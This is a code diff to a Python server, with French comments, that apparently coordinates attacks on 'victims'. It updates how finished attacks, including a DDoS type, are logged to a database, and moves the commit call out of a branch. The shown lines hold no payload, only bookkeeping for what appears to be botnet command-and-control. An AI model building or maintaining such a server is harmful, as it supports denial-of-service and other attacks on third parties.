@@ -288,7 +288,10 @@ def start_server(port, logger):
 
                     # Mise à jour de l'attaque
                     if attack_type == "ddos":
-                        query = "UPDATE group_attacks SET state = 'done', result = %s WHERE id = %s"
+                        print("DDOS UPDATED")
+                        query = "UPDATE victim_attacks SET state = 'done', result = 'done' WHERE id = %s"
+                        values = (attack_id, )
+
                     else :
                         # Vérification de l'existence du dossier pour y mettre le resultat de l'attaque
                         if not os.path.exists(ROOT_PATH + "results/" + str(attack_type) + "/" + str(client['uid']) + "/"):
@@ -310,9 +313,11 @@ def start_server(port, logger):
                         query = "UPDATE victim_attacks SET state = 'done', result = %s WHERE id = %s"
                     
                         values = (result_file_name, attack_id, )
-                        mycursor.execute(query, values)
 
-                        db.commit()
+                        
+                    mycursor.execute(query, values)
+
+                    db.commit()
 
                     logger.info("attaque : " + str(attack_id) + " terminée")
                     print("[+] attack updated in the database (done !)")
